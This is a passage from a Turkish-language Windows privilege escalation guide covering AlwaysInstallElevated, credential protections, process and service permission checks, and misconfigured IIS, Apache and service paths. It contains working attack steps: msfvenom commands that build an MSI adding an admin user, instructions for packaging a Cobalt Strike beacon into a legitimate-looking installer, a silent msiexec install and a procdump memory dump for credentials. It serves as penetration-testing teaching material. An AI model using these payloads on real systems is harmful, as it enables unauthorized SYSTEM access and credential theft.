Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, relay edilen kimliğin nesne ACL'sini ve seçilen COM class'ının kimlik doğrulama ve impersonation düzeylerini kontrol edin. Çağıranın oturum açma türü ve kimlik bilgisi bağlamı önemlidir: WinRM oturumu, etkileşimli veya yeni kimlik bilgileriyle açılan bir oturumdan farklı davranabilir. Firewall/OXID yönlendirmesi ve yüklü güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen bir ACL'yi incelenmesi gereken bir durum olarak değerlendirin; pasif enumerasyon COM coercion'ı, relay authentication'ı veya dizin yazma işlemlerini tetiklememelidir. Makine hesabına ait bir shadow credential, makine bileti alınmasını sağlayabilir; ancak ayrı bir DCSync yolu için bu hesabın gerekli dizin çoğaltma haklarına sahip olması gerekir.

**Exploit'i** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulun.

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

Bu 2 kayıt defteri girdisi **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter session'ınız varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Power-up'taki `Write-UserAddMSI` komutunu kullanarak, ayrıcalıkları yükseltmek için geçerli dizinde bir Windows MSI binary'si oluşturun. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişimine ihtiyacınız olacaktır):

```
Write-UserAddMSI
```

Oluşturulan binary'yi çalıştırarak yetkileri yükseltin.

### MSI Wrapper

Bu araçları kullanarak MSI wrapper oluşturmayı öğrenmek için bu öğreticiyi okuyun. Yalnızca **komut satırlarını** **çalıştırmak** istiyorsanız "**.bat**" dosyasını da wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI Oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI Oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini belirleyin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini belirleyin ve **Create**'e tıklayın.
- 4 adımdan 3. adıma (include edilecek dosyaları seçme) ulaşana kadar **Next**'e tıklayın. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
  - Yüklü uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi diğer özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'a sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, yükleyici çalıştırılır çalıştırılmaz beacon payload'ının yürütülmesini sağlar.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak, **derleyin**.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü amaçlı `.msi` dosyasının **kurulumunu** arka planda çalıştırmak için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Algılayıcılar

### Denetim Ayarları

Bu ayarlar nelerin **kayıt altına alındığını** belirler, bu yüzden dikkat etmelisiniz.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding'de günlüklerin nereye gönderildiğini bilmek ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarını yönetmek** için tasarlanmıştır. Her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından görüntülenebilir.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi edinin**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Koruması

**Windows 8.1** ile birlikte Microsoft, sistemi daha da güvenli hâle getirmek için güvenilmeyen işlemlerin Local Security Authority (LSA) belleğini **okuma** veya LSA'ya kod enjekte etme girişimlerini **engelleyen** gelişmiş korumayı kullanıma sundu.\
[**LSA Protection hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10** ile kullanıma sunuldu. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı gruplardan birine üyeyseniz ayrıcalıklarınızı yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalıkları yükseltmek için bunların nasıl kötüye kullanılabileceği hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

Bu sayfada **token** hakkında daha fazla bilgi edinin: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlgi çekici token'lar** ve bunların nasıl kötüye kullanılabileceği hakkında bilgi edinmek için aşağıdaki sayfaya göz atın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Ev klasörleri

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola İlkesi

```bash
net accounts
```

### Panonun içeriğini al

```bash
powershell -command "Get-Clipboard"
```

## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Öncelikle, süreçleri listelerken **sürecin komut satırında parola olup olmadığını kontrol edin**.\
Olası [**DLL Hijacking saldırılarından**](dll-hijacking/index.html) yararlanmak için **çalışan bir binary'nin üzerine yazıp yazamayacağınızı** veya binary klasörüne yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; bunları ayrıcalıkları yükseltmek için istismar edebilirsiniz.

Bir debugger listener kısa süreliğine çalışıyor olabilir; bu nedenle tek bir pasif port görüntüsünde görünmemesi, hiçbir zaman dışarıya açık olmadığı anlamına gelmez. Gözlemlenen listener'ları PID, süreç sahibi ve düşük ayrıcalıklı kullanıcının bu listener'lara erişebilme olanağıyla ilişkilendirin; yalnızca uygulama adı veya debug flag'i, kullanıcılar arası kod yürütmenin mümkün olduğunu kanıtlamaz. Rutin numaralandırmayı pasif tutun ve debugger komutları göndermeyin.

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Süreçlerin çalıştırılabilir dosyalarının bulunduğu klasörlerin izinlerini denetleme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, `snort.exe -c <config>` ile seçilen yapılandırmada tanımlanmış bir `dynamicpreprocessor directory` içinden paylaşımlı kütüphaneler yükleyebilir. Snort'u farklı bir hesapla çalıştıran zamanlanmış bir görev veya hizmet için, kullanılan yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız bu dizinde dosya oluşturabiliyorsa, görev veya hizmet modülleri bir sonraki yüklediğinde bu yol kod yürütme açısından incelenmeye değer bir adaydır. Çalıştırma hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve tüm deny veya paylaşım kısıtlamalarını doğrulayın; yalnızca dizinin yazılabilir olması ayrıcalık yükseltmesini kanıtlamaz. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme), çalışma zamanında modül yüklemeyi açıklar.

### Yazılabilir belge köküne sahip ayrıcalıklı web hizmeti

Windows Apache kurulumunda, hizmetin çalıştırılabilir dosya yolunu ve çalıştırma hesabını, etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Geleneksel bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış belge kökünün (genellikle `C:\xampp\htdocs`) ACL'sini inceleyin. Daha düşük ayrıcalıklı bir kullanıcı bu kökte dosya oluşturabiliyorsa ve Apache `LocalSystem` olarak çalışıyorsa, sunucu tarafı kod yürütme ana makinedeki ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam olarak bu yolun sunulduğunu ve bir sunucu tarafı işleyicisinin dosya türünü işlediğini doğrulayın; yalnızca kökün yazılabilir olması dosya oluşturulabildiğini kanıtlar. Bir test dosyası yazmadan ACL'leri inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Konvansiyonel bir WAMP kurulumunda hizmet, sürümü belirtilmiş bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasını (32 bitlik bir düzen için `C:\wamp\...`) gösterebilir; yapılandırma dosyası da yanındaki `conf\httpd.conf` konumunda, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` konumunda olabilir. Hizmetin tam yürütülebilir dosya yolunu, çalıştırıldığı kimliği, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dâhil) ve kök dizinin ACL'sini birlikte kontrol edin. Yazılabilir bir WAMP dizini, Apache'nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı çalıştırdığını kanıtlamaz. [Apache, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini açıklar](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kökü ve uygulama havuzunun ağ kimliği

IIS için, yazılabilir fiziksel dizini `applicationHost.config` içindeki **etkin bir site/uygulamayla** eşleştirin; ardından yapılandırılmış havuzu ve sunucu tarafı işleyicisini belirleyin. Sunulan bir dizine yerleştirilen kod, yalnızca IIS bu dosya türünü işliyorsa ve ilgili yola erişilebiliyorsa havuz kimliğiyle çalışır. Yazılabilir bir dizini kod yürütme olarak değerlendirmeden önce mevcut kullanıcının etkin dosya oluşturma erişimini, sitenin çalışma durumunu, işleyiciyi ve yola özgü geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi ayrıca incelenmesi gereken bir yol sunar: uygulamanın derleme dizinindeki oluşturulmuş dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bu konumu değiştirebilir. [Microsoft konumu ve uygulama başına alt dizinleri belgeler](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzları birbirine güvenmiyorsa derleme dizinlerinin yalıtılmasını önerir](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir token, **belirli** uygulamanın önbelleğindeki oluşturulmuş kaynak kodu değiştirebiliyorsa uygulamanın bunu daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL'si kod yürütüldüğünü kanıtlamaz: önbelleği etkin uygulama, etkin token ve ACL, derleme ayarları, işlem kimliği ve yeniden derleme zamanlamasıyla ilişkilendirin. Salt okunur metadata incelemesi yapın; envanter çıkarırken derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token'ı düşük ayrıcalıklı olsa bile, genellikle etki alanı kaynaklarında **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrulaması yapar. `LocalSystem` yerel olarak zaten yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise normalde ağda anonim kimlik bilgileri sunar. `SpecificUser` havuzu, yapılandırılmış hesabını kullanır. [Microsoft bu kimlik türlerini](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) belgeler. Atlanmış bir kimlik ayarı, IIS sürümlerine göre değişen havuz varsayılanlarından devralınabilir; bu nedenle havuz adına bakarak tahmin yürütmek yerine etkin yapılandırmayı belirleyin. Kod yürütme bilgisayar hesabı ağ kimliğine sahip bir havuza ulaşıyorsa **ilgili bilgisayarın** dizin izinlerini değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma izinleri gerektirir; bir makine hesabı bileti veya ana bilgisayar rolü tek başına bu izinlerin varlığını kanıtlamaz. Pasif envanter çıkarırken dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırmayı ve ACL'leri inceleyin.

Yardımcı bir işlem başlatan, okunabilir bir ASP.NET işleyicisi için istekten gelen değerleri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma adımlarında izleyin. Kod çözülmüş bir token'ı `ProcessStartInfo("cmd", "/c ...")` içine birleştiren bir işleyici, kabuk metakarakterlerinin komutu değiştirmesine izin verebilir; [Microsoft, `cmd` özel karakterlerini belgeler](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağırıcının kodu çözülmüş değeri gerçekten etkileyebildiğini ve işleyiciye ulaşabildiğini doğrulayın; ardından etkin uygulama havuzu veya kimliğe bürünülen kimliği ve alt işlemin kimliğini belirleyin. Okunabilir bir kaynak kod satırı, localhost dinleyicisi veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut yürütüldüğünü kanıtlamaz. Pasif envanter çıkarırken sahte istekler göndermeden veya yardımcı programı çalıştırmadan kaynak kodu ve havuz yapılandırmasını inceleyin.

Windows üzerinde çalışan bir PHP hizmetinde, istekle denetlenebilen ve [`include` veya `require`](https://www.php.net/manual/en/function.include.php) içine aktarılan bir yol, düşük kullanıcının yazabildiği bir PHP dosyasını worker kimliği altında çalıştırabilir. İsteğin ilgili ifadeye ulaşabildiğini, çözümlenen yolun düşük kullanıcının değiştirebildiği ve worker'ın okuyabildiği bir dosyayı gösterdiğini, geçerli PHP yol kısıtlamalarının include işlemine izin verdiğini ve worker'ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Tek başına bir loopback dinleyicisi veya yazılabilir dosya bu zinciri kanıtlamaz; pasif envanter çıkarırken uç noktayı çağırmadan kaynak kodu, hizmet kimliğini ve dosya ACL'lerini inceleyin.

### Bellekten parola madenciliği

Sysinternals'ın **procdump** aracıyla çalışan bir işlemin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerin **kimlik bilgileri bellekte açık metin olarak bulunur**; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" aratın ve "Click to open Command Prompt" seçeneğine tıklayın

### Ayrıcalıklı proje dosyası içe aktarma

Daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Yazılabilir tam yolu**, dosyayı açan süreci veya görevi, etkin kimliğini ve parser derlemesini inceleyin. [Tarihî bir Ghidra projesi açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje metadata'sında XML external entity kullanımına izin veriyordu; Windows'ta bir network entity, [outbound SMB and NTLM policy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa içe aktarma hesabından kimlik doğrulamaya neden olabilirdi. Bu, kimlik bilgisi açığa çıkması ihtimalidir; doğrudan administrator erişimi değildir: yanıtın ayrı, yetkili veya güvenlik açığı bulunan bir yol üzerinden kullanılabilir olması gerekir ve güncel derlemeler gerçek yama durumlarına göre değerlendirilmelidir. Pasif enumeration sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Services

Service Control Manager (SCM) nesnesindeki [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir service üzerindeki haklardan ayrıdır. Bu hak için salt okunur bir [`OpenSCManager` erişim isteğinin](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) başarılı olması, inceleme için bir ipucudur; yeni bir service'in çalıştırılabileceğinin kanıtı değildir. [`CreateService` bir handle döndürür](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew); bu handle, oluşturma sırasında istenen service erişimine sahiptir. Service'i daha sonra yeniden açmak ayrı bir erişim denetimi gerçekleştirir ve ilk handle kullanılabilir olsa bile başarısız olabilir. Etkin yerel veya uzak token'ı, verilen handle haklarını, service hesabını, başlatma politikasını ve çalıştırılabilir dosya yolunu ayrı ayrı doğrulayın. Pasif enumeration sırasında service oluşturmayın veya başlatmayın.

Uzak bir service yükleme yolu için bu SCM haklarını, hedefte **aynı network logon** hesabının yazabildiği bir share, share'in temelindeki NTFS ACL ve service hesabının çalıştırabileceği yerel bir çalıştırılabilir dosya yolu ile ilişkilendirin. Olağandışı geniş SCM hakları ve dosya yerleştirme yolu birlikte mevcutsa admin olmayan bir hesap bu sınırı aşabilir; administrative share zorunlu değildir. Tek başına share'a yazma erişimi veya SCM create-service ipucu, yeni service'in daha yüksek bir kimlikle başlatılabileceğini göstermez.

Mevcut bir service, yardımcı dosya `ImagePath` içinde bulunmasa bile başlatma, kapatma veya başka bir yaşam döngüsü olayı sırasında bir yardımcı çalıştırılabilir dosyayı çağırabilir. Yardımcının adı, daha düşük ayrıcalıklı kullanıcının yazabildiği bir dizine çözümleniyorsa ve service daha yüksek bir kimlikle çalışıyorsa eksik yardımcı dosya koşula bağlı bir değiştirme adayıdır. **Gerçek service kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen çalıştırılabilir dosya yolunu ve arama sırasını, dizin oluşturma haklarını, service kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir service dizini veya tek başına eksik dosya, service'in dosyayı yüklediğini göstermez; pasif inceleme sırasında service'i başlatmayın veya durdurmayın.

Mevcut bir service için [`SERVICE_START`, `StartService`'e argüman sağlama izni verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu hak [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) hakkından ayrıdır. Başlatma erişimini bir denetim hakkından fazlası olarak değerlendirmeden önce service'in kodunu veya belgelenmiş arayüzünü inceleyin. Service, çağıranın seçtiği bir argümanı log veya dışa aktarma yolu olarak kullanıyorsa service kimliğini, argümandan yazmaya giden tam akışı, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korumalı bir dizine yazma, yalnızca ayrıcalıklı bir tüketici veya yükleyici dosyayı kabul ederse yükseltmeye dönüşebilir; tek başına yazılabilir bir log veya başlatma hakkı yeterli değildir. Pasif envanter sırasında service'i başlatmayın veya test dosyası oluşturmayın.

NSClient++ monitoring agent için okunabilir bir `nsclient.ini`, bir **yapılandırma inceleme ipucudur**: web kimlik bilgilerini içerebilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek service hesabını, WEB listener'ını ve erişim politikasını, ayrıca kimliği doğrulanmış rolün ayarları veya script'leri değiştirip değiştiremediğini kontrol edin. Ayrıcalıklı çalıştırma ayrıca `CheckExternalScripts` (veya etkin başka bir çalıştırma yolu), bir komutu kaydetmek ya da değiştirmek için etkin bir hak ve komutu service kimliği altında çalıştıran bir tetikleyici gerektirir. Yalnızca loopback üzerinde dinleyen bir listener'a yerel bir kullanıcı yine de erişebilir; ancak tek başına dosya yolu, parola veya listener bu hakların varlığını göstermez. Pasif enumeration sırasında sırları görüntülemeden veya web API'sini çağırmadan metadata'yı ve izinleri inceleyin. Bkz. [NSClient++ file layout](https://nsclient.org/docs/concepts/file-layout/), [web ve script güvenliği yönergeleri](https://nsclient.org/docs/setup/securing/) ve [external-script yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir service için service'in gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM, alt uygulamayı burada saklar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h); `AppDirectory` ise yapılandırılmış çalışma dizinidir. Wrapper'ın izinlerini service sınırının tamamı olarak değerlendirmeden önce alt çalıştırılabilir dosyayı ve üst dizin ACL'lerini kontrol edin. Bu alt uygulamanın açığa çıkardığı yerel bir WCF veya SOAP endpoint'i ayrı bir inceleme ipucudur: daha düşük ayrıcalıklı kullanıcının listener'a erişebildiğini, ilgili işlemin kullanıcının girdisini kabul ettiğini ve service alt sürecinin güvensiz işlemi daha yüksek bir kimlik altında yürüttüğünü doğrulayın. Service hesabı, bir endpoint URL'si veya yazılabilir bir yol tek başına yükseltmeyi kanıtlamaz; pasif enumeration sırasında service işlemlerini çağırmaktan kaçının.

Özel bir WCF işlemi için çağıranın denetimindeki bir string'in herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript` script metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke` pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows transport credentials kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **ilgili işleme** çağrı yetkisi ve runspace'in etkin kimliği ayrıca denetlenmelidir. Daha düşük ayrıcalıklı bir çağıranın girdisinden daha yüksek ayrıcalıklı bir service kimliği altında `AddScript`'e giden bir yol, code-execution sınırıdır; yalnızca dinleyen bir port, kimliği doğrulanmış bir istemci veya ilgisiz bir assembly'deki kullanılmayan bir metot kanıt değildir. Enumeration sırasında endpoint'i çağırmadan dağıtılan service'i, contract'ı, yetkilendirmeyi ve impersonation ayarlarını statik olarak inceleyin.

Service Triggers, belirli koşullar oluştuğunda Windows'un bir service'i başlatmasını sağlar (named pipe/RPC endpoint etkinliği, ETW event'leri, IP kullanılabilirliği, cihaz bağlanması, GPO yenilemesi vb.). SERVICE_START hakları olmadan da çoğu zaman tetikleyicilerini çalıştırarak ayrıcalıklı service'leri başlatabilirsiniz. Enumeration ve aktivasyon teknikleri için bkz.:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling içeren Visual Studio kurulumlarında `LocalSystem` olarak çalışacak şekilde yapılandırılmış `VSStandardCollectorService150` diagnostic service'i bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), service DACL sıfırlamasını yönlendirmek için bir junction ve object-manager-link race kullandı. Gösterilen yükseltme ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolunu ve bu yoldaki `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefini gerektiriyordu. Bileşendeki açık Ocak 2024'te giderildi.

Pasif ilk değerlendirme için yalnızca bu service'in hesabını ve binary path'ini inceleyin, Setup WMI compiler yolunun mevcut olup olmadığını kontrol edin ve yüklü bileşenin yama durumunu doğrulayın. Bir service kaydı, Visual Studio ürün sürümü veya compiler dosyası tek başına sistemin savunmasız olduğunu göstermez. İnceleme sırasında service'i başlatmak veya onarım çalıştırmak gerekmez.

Service listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi edinmek için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_ araçlarından **accesschk**'in bulunması önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
